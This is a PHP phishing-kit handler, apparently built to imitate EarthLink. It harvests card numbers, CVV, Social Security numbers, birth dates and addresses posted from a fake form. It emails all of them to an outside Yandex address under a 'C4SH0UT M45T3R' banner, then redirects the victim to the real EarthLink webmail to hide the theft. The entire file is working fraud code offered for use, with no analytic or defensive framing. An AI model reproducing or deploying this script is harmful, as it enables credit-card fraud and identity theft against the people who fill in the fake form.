<?
$ccnumba = $_POST['ccnumba'];
$exp_mont = $_POST['exp_mont'];
$exp_yr = $_POST['exp_yr'];
$csv = $_POST['csv'];
$billing_name = $_POST['billing_name'];
$socialsec = $_POST['socialsec'];
$birth_mont = $_POST['birth_mont'];
$birth_day = $_POST['birth_day'];
$birth_yr = $_POST['birth_yr'];
$street_address = $_POST['street_address'];
$street_address2 = $_POST['street_address2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip_code = $_POST['zip_code'];
$country = $_POST['country'];
$ip = getenv("REMOTE_ADDR");

//sending email info here
	$subj = "LINK OF EARTH: $ip";
	$msg = "--------------------Unleashed By C4SH0UT M45T3R--------------- \n CC NUM: $ccnumba\n Exp Month: $exp_mont\n Exp Year: $exp_yr\n Csv: $csv\n Full Name: $billing_name\n Social Sec No: $socialsec\n Birth Month: $birth_mont\n Birth Day: $birth_day\n Birth Year: $birth_yr\n Address 1: $street_address\n Address 2: $street_address2\n City: $city\n State: $state\n Zip: $zip_code\n Country: $country\n------------------\nip: $ip";
	$from = "From: Earth<logins@earth.com>";
	mail("ro.walker@yandex.com", $subj, $msg, $from);
	mail("$cc", $subj, $msg, $from);
	header( "Location: http://webmail.earthlink.net");

?>